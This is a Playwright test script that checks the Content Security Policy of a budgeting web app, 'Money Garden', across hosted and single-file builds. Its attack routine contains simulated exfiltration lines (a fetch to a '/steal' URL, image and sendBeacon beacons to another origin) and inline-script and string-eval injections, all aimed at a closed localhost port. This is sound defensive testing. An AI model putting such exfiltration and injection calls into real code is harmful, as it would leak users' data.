// Content Security Policy (v0.18.2), in a real browser.
// Usage: node csp.mjs [enforced|absent] [chromium|webkit|firefox]
//   enforced (default): the app works with ZERO violations, every attack is blocked.
//   absent: control run against a build WITHOUT the policy (point E2E_DIST /
//           E2E_SINGLE at it) — attacks must succeed, proving it's the policy
//           doing the blocking, not something else.
import { chromium, webkit, firefox } from "playwright";
import { spawn, execSync } from "node:child_process";
import { readFileSync } from "node:fs";
import { SP, DIST, SINGLE, shot } from "./paths.mjs";
const [EXPECT = "enforced", ENGINE = "chromium"] = process.argv.slice(2);
const engine = { chromium, webkit, firefox }[ENGINE];
const enforced = EXPECT === "enforced";
const PORT = 8148; const BASE = `http://127.0.0.1:${PORT}/`;
try { execSync(`lsof -tnP -iTCP:${PORT} -sTCP:LISTEN | xargs kill`, { stdio: "ignore" }); } catch {}
const server = spawn("python3", [`${SP}/server.py`, DIST, String(PORT)], { stdio: "ignore" });
const out = []; const check = (n, ok, d = "") => out.push(`${ok ? "PASS" : "FAIL"}  ${n}${d ? "  — " + d : ""}`);
let browser;

// Collect every CSP violation the page reports, from the very first script.
const watchCsp = () => {
  window.__csp = [];
  document.addEventListener("securitypolicyviolation", (e) => window.__csp.push(`${e.effectiveDirective} ${e.blockedURI}`));
  // Record the document's state when data-theme is FIRST set: the boot
  // script runs mid-parse ("loading"); the app only later. So a "loading"
  // stamp proves the boot script itself ran.
  window.__firstStamp = null;
  new MutationObserver(() => { window.__firstStamp ??= document.readyState; })
    .observe(document, { subtree: true, attributes: true, attributeFilter: ["data-theme"] });
};

/** Try each attack; return which ones got through. Run inside the page. */
const attack = async () => {
  const got = {};
  // "Blocked" means the BROWSER refused under the policy (a connect-src
  // violation), not merely that the request failed — the target port is
  // closed, so a plain rejection would prove nothing.
  const blockedByPolicy = async (u) => {
    const n = window.__csp.length;
    try { await fetch(u, { mode: "no-cors" }); } catch {}
    await new Promise((r) => setTimeout(r, 100));
    return window.__csp.slice(n).some((v) => v.startsWith("connect-src"));
  };
  got.fetchOther = !(await blockedByPolicy("http://127.0.0.1:9/steal?d=1"));
  got.fetchSelf = !(await blockedByPolicy("./"));
  window.__pwned = 0;
  const s = document.createElement("script"); s.textContent = "window.__pwned = 1"; document.head.appendChild(s);
  got.inlineScript = window.__pwned === 1;
  // eval-family check via setTimeout("…"): that string is compiled later by
  // the PAGE. (A direct eval() here wouldn't test anything — Chrome exempts
  // code injected by the test tool itself from the eval rule.)
  window.__evalRan = 0;
  try { setTimeout("window.__evalRan = 1", 0); } catch {}
  await new Promise((r) => setTimeout(r, 200));
  got.stringTimer = window.__evalRan === 1;
  window.__pwned2 = 0;
  const d = document.createElement("div"); d.setAttribute("onclick", "window.__pwned2 = 1"); document.body.appendChild(d); d.click(); d.remove();
  got.inlineHandler = window.__pwned2 === 1;
  const before = window.__csp.length;
  const img = new Image(); img.src = "http://127.0.0.1:9/beacon.png?d=1";
  await new Promise((r) => setTimeout(r, 300));
  got.imageBeacon = !window.__csp.slice(before).some((v) => v.startsWith("img-src"));
  const before2 = window.__csp.length;
  try { navigator.sendBeacon("http://127.0.0.1:9/beacon", "d=1"); } catch {}
  await new Promise((r) => setTimeout(r, 300));
  got.sendBeacon = !window.__csp.slice(before2).some((v) => v.startsWith("connect-src"));
  return got;
};

try {
  let pid = null;
  for (let i = 0; i < 50 && pid === null; i++) { try { pid = Number(await (await fetch(BASE + "__pid")).text()); } catch { await new Promise((r) => setTimeout(r, 100)); } }
  if (pid !== server.pid) throw new Error("orphan server on port");
  browser = await engine.launch();

  // ---------- hosted build, normal use ----------
  { const ctx = await browser.newContext({ viewport: { width: 390, height: 844 }, serviceWorkers: "allow", acceptDownloads: true });
    await ctx.addInitScript(watchCsp);
    await ctx.addInitScript(() => { localStorage.setItem("money-garden:theme", "night"); localStorage.setItem("money-garden:install-hint", "muted"); });
    const page = await ctx.newPage(); const errors = []; const consoleCsp = [];
    page.on("pageerror", (e) => errors.push(e.message));
    page.on("console", (m) => { if (/Content Security Policy/i.test(m.text())) consoleCsp.push(m.text().slice(0, 160)); });
    page.setDefaultTimeout(6000);
    await page.goto(BASE); await page.getByText("Money Garden", { exact: true }).waitFor();
    const policy = await page.evaluate(() => document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content ?? null);
    check("H0 policy present in the hosted page", enforced ? !!policy : policy === null, policy?.slice(0, 60) ?? "none");
    check("H1 boot script ran (theme stamped mid-parse, before the app)", (await page.evaluate(() => window.__firstStamp)) === "loading", await page.evaluate(() => window.__firstStamp));
    await page.getByRole("button", { name: "Plant sample data", exact: true }).click(); await page.waitForTimeout(150);
    for (const t of ["Log", "Budgets", "Garden", "Orchard", "Seasons", "Advice", "Overview"]) {
      await page.getByRole("button", { name: new RegExp(t) }).first().click(); await page.waitForTimeout(250);
    }
    check("H2 every tab renders", (await page.locator("main").innerText()).length > 200);
    // fonts.check() also says true for a font that isn't declared at all, so
    // look for actual faces that finished loading.
    const loadedFaces = () => page.evaluate(async () => { await document.fonts.ready; return [...document.fonts].filter((f) => f.status === "loaded").map((f) => f.family.replace(/["']/g, "")); });
    const faces = await loadedFaces();
    check("H3 web fonts load (font-src)", faces.includes("Fraunces") && faces.includes("DM Sans"), JSON.stringify([...new Set(faces)]));
    check("H4 stylesheet applied (style-src): palette variables defined", (await page.evaluate(() => getComputedStyle(document.documentElement).getPropertyValue("--bg").trim())) !== "");
    await page.getByRole("button", { name: /Log/ }).first().click();
    await page.getByPlaceholder("0.00").fill("4.5"); await page.getByPlaceholder("Ramen with Sam").fill("CSP coffee");
    await page.getByRole("button", { name: "Add expense", exact: true }).click(); await page.waitForTimeout(150);
    check("H5 logging saves", (await page.evaluate(() => localStorage.getItem("money-garden:state-v1"))).includes("CSP coffee"));
    // Saved "night" → tap: auto → tap: day → tap: night. The day step is the
    // one the clock can't produce on its own here, so check it exactly.
    const btn = page.getByRole("button", { name: "Switch theme (day, night, or auto)" });
    const theme = () => page.evaluate(() => document.documentElement.dataset.theme);
    await btn.click(); await btn.click(); await page.waitForTimeout(100);
    const second = await theme();
    await btn.click(); await page.waitForTimeout(100);
    check("H6 theme toggle cycles (→ auto → day → night)", second === "day" && (await theme()) === "night", `${second} → ${await theme()}`);
    const [dl] = await Promise.all([page.waitForEvent("download"), page.getByRole("button", { name: "⬇️ Save backup", exact: true }).click()]);
    const backup = readFileSync(await dl.path(), "utf8");
    check("H7 backup download works (blob download)", backup.includes("CSP coffee"));
    await page.locator('input[type="file"]').setInputFiles({ name: "b.json", mimeType: "application/json", buffer: Buffer.from(backup) });
    await page.getByRole("button", { name: "Replace my garden", exact: true }).click(); await page.waitForTimeout(150);
    check("H8 backup import works", await page.getByText("Garden restored").isVisible());
    await page.getByRole("button", { name: /Seasons/ }).first().click(); await page.waitForTimeout(600);
    check("H9 charts draw (inline SVG + style attrs)", (await page.locator("main svg rect").count()) > 5);
    // Service worker: registers under worker-src, then serves the app offline.
    const swOk = await page.evaluate(async () => { const r = await Promise.race([navigator.serviceWorker.ready.then(() => true), new Promise((res) => setTimeout(() => res(false), 5000))]); return r; });
    check("H10 service worker registers (worker-src)", swOk === true);
    // The manifest isn't fetched by headless Chromium on its own — ask for it
    // (DevTools protocol), so manifest-src is actually exercised.
    if (ENGINE === "chromium") { // the DevTools manifest call exists only in Chromium
      const cdp = await ctx.newCDPSession(page);
      const mf = await cdp.send("Page.getAppManifest");
      check("H10b manifest loads and parses under manifest-src", mf.errors.length === 0 && /Money Garden/.test(mf.data ?? ""), JSON.stringify(mf.errors));
    }
    // Snapshot the violations so far: the offline reload below restarts the
    // page (and its violation log).
    const beforeReload = await page.evaluate(() => window.__csp);
    await page.waitForTimeout(800);
    await ctx.setOffline(true);
    await page.reload(); await page.getByText("Money Garden", { exact: true }).waitFor();
    check("H11 offline reload served by the service worker", await page.getByText("Money Garden", { exact: true }).isVisible());
    await ctx.setOffline(false);
    const v = beforeReload.concat(await page.evaluate(() => window.__csp));
    check("H12 ZERO policy violations during normal use (before and after the reload)", v.length === 0 && consoleCsp.length === 0, JSON.stringify(v.concat(consoleCsp)).slice(0, 300));
    check("H13 no page errors", errors.length === 0, errors.join(" | "));
    await shot(page, `csp-hosted-${ENGINE}`);

    // ---------- attacks ----------
    const res = await page.evaluate(attack);
    for (const [k, through] of Object.entries(res)) {
      check(`A ${k}: ${enforced ? "blocked" : "gets through (control)"}`, enforced ? through === false : through === true);
    }
    await ctx.close(); }

  // ---------- single-file build from disk (file://) ----------
  { const ctx = await browser.newContext({ viewport: { width: 390, height: 844 }, acceptDownloads: true });
    await ctx.addInitScript(watchCsp);
    await ctx.addInitScript(() => { localStorage.setItem("money-garden:install-hint", "muted"); });
    const page = await ctx.newPage(); const errors = []; page.on("pageerror", (e) => errors.push(e.message));
    page.setDefaultTimeout(6000);
    await page.goto("file://" + SINGLE); await page.getByText("Money Garden", { exact: true }).waitFor();
    const policy = await page.evaluate(() => document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content ?? null);
    check("S0 policy present in the single file", enforced ? !!policy : policy === null);
    await page.getByRole("button", { name: "Plant sample data", exact: true }).click(); await page.waitForTimeout(150);
    for (const t of ["Log", "Budgets", "Garden", "Orchard", "Seasons", "Advice", "Overview"]) {
      await page.getByRole("button", { name: new RegExp(t) }).first().click(); await page.waitForTimeout(250);
    }
    check("S1 every tab renders from file://", (await page.locator("main").innerText()).length > 200);
    const sFaces = await page.evaluate(async () => { await document.fonts.ready; return [...document.fonts].filter((f) => f.status === "loaded").map((f) => f.family.replace(/["']/g, "")); });
    check("S2 inlined fonts load (font-src data:)", sFaces.includes("Fraunces") && sFaces.includes("DM Sans"), JSON.stringify([...new Set(sFaces)]));
    const [dl] = await Promise.all([page.waitForEvent("download"), page.getByRole("button", { name: "⬇️ Save backup", exact: true }).click()]);
    check("S3 backup download works", readFileSync(await dl.path(), "utf8").includes("money-garden"));
    const v = await page.evaluate(() => window.__csp);
    check("S4 ZERO policy violations in the single file", v.length === 0, JSON.stringify(v).slice(0, 300));
    check("S5 no page errors", errors.length === 0, errors.join(" | "));
    const res = await page.evaluate(attack);
    for (const k of ["fetchOther", "inlineScript", "stringTimer", "inlineHandler"]) {
      check(`SA ${k}: ${enforced ? "blocked" : "gets through (control)"}`, enforced ? res[k] === false : res[k] === true);
    }
    await shot(page, `csp-single-${ENGINE}`);
    await ctx.close(); }

  await browser.close();
} catch (e) { out.push("ERROR " + (e.stack || e).toString().split("\n").slice(0, 3).join(" | ")); } finally {
  await browser?.close().catch(() => {}); server.kill(); console.log(out.join("\n"));
  // Non-zero exit when any check failed (or none ran) — useful run alone, too.
  process.exitCode = out.length && out.every((l) => l.startsWith("PASS")) ? 0 : 1;
}
